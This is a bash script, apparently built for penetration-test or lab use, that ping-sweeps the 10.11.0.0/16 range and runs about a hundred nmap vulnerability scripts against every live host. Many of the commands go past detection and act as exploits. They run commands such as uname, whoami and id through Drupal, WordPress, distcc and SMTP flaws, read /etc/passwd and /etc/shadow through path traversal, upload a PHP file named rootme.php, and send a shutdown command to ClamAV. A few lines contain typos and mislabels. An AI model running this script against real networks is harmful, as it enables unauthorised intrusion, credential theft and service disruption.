#!/bin/bash
touch /tmp/Target_IPs
for i in $(seq 0 254);
do
	echo
	echo
	printf "\033[1;33mScanning 10.11."$i".0/24 for alive hosts...\033[0m\n"
	nmap -sn -T4 10.11.$i.0/24 -oG /tmp/alive_hosts_in_subnet
	cat /tmp/alive_hosts_in_subnet | grep Up | cut -d" " -f2 >> /tmp/Target_IPs
done
echo
printf "\033[1;33mStarting a scan for vulnerabilities in most common protocols against discovered machines...\033[0m\n"
while read target;
do
	echo
	printf "\033[1;35mStarting to scan $target for SMB vulns...\033[0m\n"
	nmap --script smb-vuln-conficker.nse -p445 $target
	nmap --script smb-vuln-cve-2017-7494 -p 445 $target
	nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 $target
	nmap --script smb-vuln-cve2009-3103.nse -p445 $target
	nmap --script smb-vuln-ms06-025.nse -p445 $target
	nmap --script smb-vuln-ms07-029.nse -p445 $target
	nmap --script smb-vuln-ms08-067.nse -p445 $target
	nmap -p445 $target --script=smb-vuln-ms10-054 --script-args unsafe
	nmap -p445 $target --script=smb-vuln-ms10-061
	nmap -p445 --script smb-vuln-ms17-010 $target
	nmap -O --script smb2-vuln-uptime $target
	nmap -p445 --script smb2-vuln-uptime --script-args smb2-vuln-uptime.skip-os=true $target
	nmap --script=samba-vuln-cve-2012-1182  -p 139 $target
	echo
	printf "\033[1;35mStarting to scan $target for FTP vulns...\033[0m\n"
	nmap -p 21 --script ftp-anon $target
	nmap -sV --script=ftp-libopie $target
	nmap -p 21 --script=ftp-syst.nse $target
	nmap --script ftp-vsftpd-backdoor -p 21 $target
	nmap --script ftp-proftpd-backdoor -p 21 $target
	nmap --script ftp-vuln-cve2010-4221 -p 21 $target
	echo
	printf "\033[1;35mStarting to scan $target for RDP vulns...\033[0m\n"
	nmap -sV --script=rdp-vuln-ms12-020 -p 3389 $target
	echo
        printf "\033[1;35mStarting to scan $target for MySQL vulns...\033[0m\n"
	echo
	nmap -sV --script=mysql-empty-password $target
	nmap -p3306 --script mysql-vuln-cve2012-2122 $target
	nmap -sV --script mysql-vuln-cve2012-2122 $target
	printf "\033[1;35mStarting to scan $target for HTTP vulns...\033[0m\n"
	nmap -sV --script http-adobe-coldfusion-apsa1301 $target
	nmap -p80 --script http-adobe-coldfusion-apsa1301 --script-args basepath=/cf/adminapi/ $target
	nmap --script=http-drupal-enum-users --script-args http-drupal-enum-users.root="/path/" $target
	nmap -sV --script=http-enum $target
	nmap -p80 --script http-errors.nse $target
	nmap $target -p 80 --script=http-frontpage-login
	nmap --script http-git.nse -p 80 $target
	nmap -p80 --script http-iis-short-name-brute $target
	nmap --script http-iis-webdav-vuln -p80,8080 $target
	nmap --script http-internal-ip-disclosure $target
	nmap -p80 --script http-litespeed-sourcecode-download --script-args http-litespeed-sourcecode-download.uri=/phpinfo.php $target
	nmap -p8088 --script http-litespeed-sourcecode-download $target
	nmap -p80 --script http-majordomo2-dir-traversal $target
	nmap -p 80 --script http-ntlm-info --script-args http-ntlm-info.root=/root/ $target
	nmap --script http-passwd --script-args http-passwd.root=/test/ $target
	nmap -sV --script=http-php-version $target
	nmap -p80 --script http-phpmyadmin-dir-traversal --script-args="dir='/pma/',file='../../../../../../../../etc/passwd',outfile='passwd.txt'" $target
	nmap -p80 --script http-phpmyadmin-dir-traversal $target
	nmap -p 80 $target --script http-put --script-args http-put.url='/uploads/rootme.php',http-put.file='/tmp/rootme.php'
	nmap --script http-rfi-spider -p80 $target
	nmap --script http-robots.txt -p 80 $target
	nmap -sV -p- --script http-shellshock $target
	nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls $target
	nmap -sV --script http-vuln-cve2006-3392 $target
 	nmap -p80 --script http-vuln-cve2006-3392 --script-args http-vuln-cve2006-3392.file=/etc/shadow $target
	nmap --script=http-vuln-cve2009-3960 --script-args http-http-vuln-cve2009-3960.root="/root/" $target
	nmap --script=http-vuln-cve2010-0738 --script-args 'http-vuln-cve2010-0738.paths={/path1/,/path2/}' $target
	nmap --script http-vuln-cve2010-2861 $target
	nmap --script http-vuln-cve2011-3192.nse -pT:80,443 $target
	nmap --script http-vuln-cve2011-3368 $targets
	nmap -sV --script http-vuln-cve2012-1823 $target
	nmap -p80 --script http-vuln-cve2012-1823 --script-args http-vuln-cve2012-1823.uri=/test.php $target
	nmap -sV --script http-vuln-cve2013-0156 $target
	nmap -sV --script http-vuln-cve2013-0156 --script-args uri="/test/" $target>
	nmap -p80 --script http-vuln-cve2013-6786 $target
	nmap -sV http-vuln-cve2013-6786 $target
	nmap -sV --script http-vuln-cve2013-7091 $target
	nmap -p80 --script http-vuln-cve2013-7091 --script-args http-vuln-cve2013-7091=/ZimBra $target
	nmap -p 443 --script http-vuln-cve2014-2126 $target
	nmap -p 443 --script http-vuln-cve2014-2127 $target
	nmap -p 443 --script http-vuln-cve2014-2128 $target
	nmap -p 443 --script http-vuln-cve2014-2129 $target
	nmap --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.cmd="uname -a",http-vuln-cve2014-3704.uri="/drupal" $target
	nmap --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.uri="/drupal",http-vuln-cve2014-3704.cleanup=false $target
	nmap --script http-vuln-cve2014-8877 --script-args http-vuln-cve2014-8877.cmd="whoami",http-vuln-cve2014-8877.uri="/wordpress" $target
	nmap --script http-vuln-cve2014-8877 $target
	nmap --script=http-vuln-cve2015-1427 --script-args command= 'ls' $targets
	nmap -sV --script vuln $target
	nmap -p80 --script http-vuln-cve2015-1635.nse $target
	nmap -sV --script http-vuln-cve2015-1635 --script-args uri='/anotheruri/' $target
	nmap --script http-vuln-cve2017-1001000 --script-args http-vuln-cve2017-1001000="uri" $target
	nmap --script http-vuln-cve2017-1001000 $target
	nmap -p 80 --script http-vuln-cve2017-5638 $target
	nmap -p 16992 --script http-vuln-cve2017-5689 $target
	nmap --script http-vuln-cve2017-8917 -p 80 $target
	nmap --script http-vuln-cve2017-8917 --script-args http-vuln-cve2017-8917.uri=joomla/ -p 80 $target
	nmap $target -p 7547 --script=http-vuln-misfortune-cookie
	nmap -sV --script http-vuln-wnr1000-creds $target -p80
	nmap --script http-webdav-scan -p80,8080 $target
	nmap -sV --script http-coldfusion-subzero $target
	nmap -p80 --script http-coldfusion-subzero --script-args basepath=/cf/ $target
	nmap -p80,443 --script http-cakephp-version $target
	nmap -p80 --script http-comments-displayer.nse $target
	nmap --script=http-config-backup $target
	nmap -p80 --script http-default-accounts $target
	nmap -p80 --script http-devframework.nse $target
	nmap -sV --script http-awstatstotals-exec.nse --script-args 'http-awstatstotals-exec.cmd="uname -a", http-awstatstotals-exec.uri=/awstats/index.php' $target
	nmap -sV --script http-awstatstotals-exec.nse $target
	nmap -p80,8080 --script http-axis2-dir-traversal --script-args 'http-axis2-dir-traversal.file=../../../../../../../etc/issue' $target
	nmap -p80 --script http-axis2-dir-traversal $target
	nmap --script http-barracuda-dir-traversal --script-args http-max-cache-size=5000000 -p 80 $target
	nmap --script http-vmware-path-vuln -p80,443,8222,8333 $target
	nmap --script http-slowloris-check  $target
	echo
        printf "\033[1;35mStarting to scan $target for SNMP vulns...\033[0m\n"
	nmap --script=smtp-vuln-cve2010-4344 --script-args="smtp-vuln-cve2010-4344.exploit" -pT:25,465,587 $target
	nmap --script=smtp-vuln-cve2010-4344 --script-args="exploit.cmd='uname -a'" -pT:25,465,587 $target
	nmap --script=smtp-vuln-cve2011-1720 --script-args='smtp.domain=<domain>' -pT:25,465,587 $target
	nmap --script=smtp-vuln-cve2011-1764 -pT:25,465,587 $target
	echo
        printf "\033[1;35mStarting to scan $target for DNS vulns...\033[0m\n"
	nmap -sU -p 53 --script=dns-random-srcport $target
	nmap -sU -p 53 --script=dns-random-txid $target
	echo
done < /tmp/Target_IPs
printf "\033[1;33mStarting a scan for vulnerabilities in other protocols/products...\033[0m\n"
while read target2;
do
	echo
        printf "\033[1;35mStarting to scan $target2 for ClamAV vulns...\033[0m\n"
	nmap -sV --script clamav-exec $target2
	nmap --script clamav-exec --script-args cmd='scan',scandb='files.txt' $target2
	nmap --script clamav-exec --script-args cmd='shutdown' $target2
	echo
	printf "\033[1;35mStarting to scan $target2 for distcc vulns...\033[0m\n"
	nmap -p 3632 $target2 --script distcc-exec --script-args="distcc-exec.cmd='id'"
	echo
	printf "\033[1;35mStarting to scan $target2 for DominoIBM vulns...\033[0m\n"
	nmap --script domino-enum-users -p 1352 $target2
	echo
        printf "\033[1;35mStarting to scan $target2 for ipmi vulns...\033[0m\n"
	nmap -sU --script ipmi-cipher-zero -p 623 $target2
	nmap -p49152 --script supermicro-ipmi-conf $target2
	echo
        printf "\033[1;35mStarting to scan $target2 for netbus vulns...\033[0m\n"
	nmap -p 12345 --script netbus-auth-bypass $target2
	echo 
	printf "\033[1;35mStarting to scan $target2 for Oracle vulns...\033[0m\n"
	nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid=ORCL $target2
	nmap --script=rmi-vuln-classloader -p 1099 $target2
	echo 
        printf "\033[1;35mStarting to scan $target2 for VNC vulns...\033[0m\n"
	nmap -sV --script=vnc-title $target2
	nmap -sV --script=realvnc-auth-bypass $target2
	echo 
        printf "\033[1;35mStarting to scan $target2 for TLS vulns...\033[0m\n"
	nmap -p 443 --script ssl-heartbleed $target2
	nmap -sV --script=sslv2-drown $target2
	nmap -p 443 --script tls-ticketbleed $target2
	echo 
        printf "\033[1;35mStarting to scan $target2 for firewall-bypass vulns...\033[0m\n"
	nmap --script firewall-bypass $target2
	nmap --script firewall-bypass --script-args firewall-bypass.helper="ftp", firewall-bypass.targetport=22 $target2
	echo 
        printf "\033[1;35mStarting to scan $target2 for WDB vulns...\033[0m\n"
	nmap -sU -p 17185 --script wdb-version $target2
done < /tmp/Target_IPs
printf "\033[1;35mDone!\033[0m\n"

